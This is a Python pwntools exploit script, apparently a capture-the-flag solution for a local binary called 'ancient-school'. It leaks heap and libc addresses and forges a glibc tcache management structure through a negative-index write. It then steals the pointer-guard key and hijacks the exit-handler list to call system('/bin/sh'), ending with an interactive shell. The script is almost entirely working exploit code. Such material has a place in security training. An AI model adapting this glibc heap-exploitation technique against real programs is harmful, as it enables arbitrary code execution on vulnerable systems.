#!/usr/bin/env python2
from pwn import *
context.terminal = ["tmux", "split", "-h"]

def talk(n):
    p.sendlineafter("> ", str(n))

def store(length, name=None):
    talk(1)
    p.sendlineafter(": ", str(length))
    if length > 0:
        p.sendlineafter(": ", name)
    
def view():
    talk(2)
    
def take():
    talk(3)
    
def cast(spell):
    talk(4)
    p.sendlineafter(": ", str(spell))

p = process("./ancient-school")
elf_libc = ELF("/lib/x86_64-linux-gnu/libc.so.6", checksec=False)
store(0)
take()
store(0)
view()
p.recvuntil(": ")
data = p.recvline().strip()
heap = u64(data + "\x00\x00\x00") << 12
print("heap", hex(heap))

store(0x130, "XXXX")
store(0x300, "XXXX")
take()
store(0x100, "XXXX")
cast(-0x507 * 8 + 2)

def faker(mapping):
    counts = []
    ptrs = []
    for i in range(64):
        sz = 0x20 + 0x10 * i
        if sz in mapping:
            count, ptr = mapping[sz]
            counts.append(count)
            ptrs.append(ptr)
        else:
            counts.append(0)
            ptrs.append(0)
    
    res  = ''.join(map(p16, counts))
    res += ''.join(map(p64, ptrs))
    return res

fake_chunk = [
    p64(0), p64(0x291),
    faker({
        0x20:  (1, heap + 0x2c0),
        0x140: (8, heap + 0x2c0),
        0x3f0: (1, heap),
    })
]

store(0x300, ''.join(fake_chunk))
store(0x130, "X")
take()
store(0)
view()
p.recvuntil(": ")
leak = u64((p.recvline().strip()) + "\x00\x00")
libc = leak - 0x219ce0
initial = libc + 0x21af00
fs30 = libc - 0x2890
print("libc", hex(libc))
print("initial", hex(initial))

fk2 = [
    p64(0), p64(0x291),
    faker({
        0x20: (1, fs30),
        0x50: (1, initial),
    })
]
store(0x3f0 - 0x10, ''.join(fk2))
store(0)
view()
p.recvuntil(": ")
key = u64(p.recvline().strip())
print("key", hex(key))
system = libc + elf_libc.symbols['system']
binsh = libc + elf_libc.search("/bin/sh\x00").next()
store(0x50 - 0x10, ''.join([
    p64(0),
    p64(1),
    p64(4),
    p64(rol(system ^ key, 17, 64)),
    p64(binsh),
    "\n",
]))

# gdb.attach(p)
talk(5)
sleep(0.5)
p.sendline("id")
p.interactive()


"""
0x2a2 = 0x557647d482c0 - 0x557647d4801e
0x55afa32fd710 - 0x55afa32fd209
0x000055afa32fd400
call {long ()(long)}(malloc)(0x10)
"""
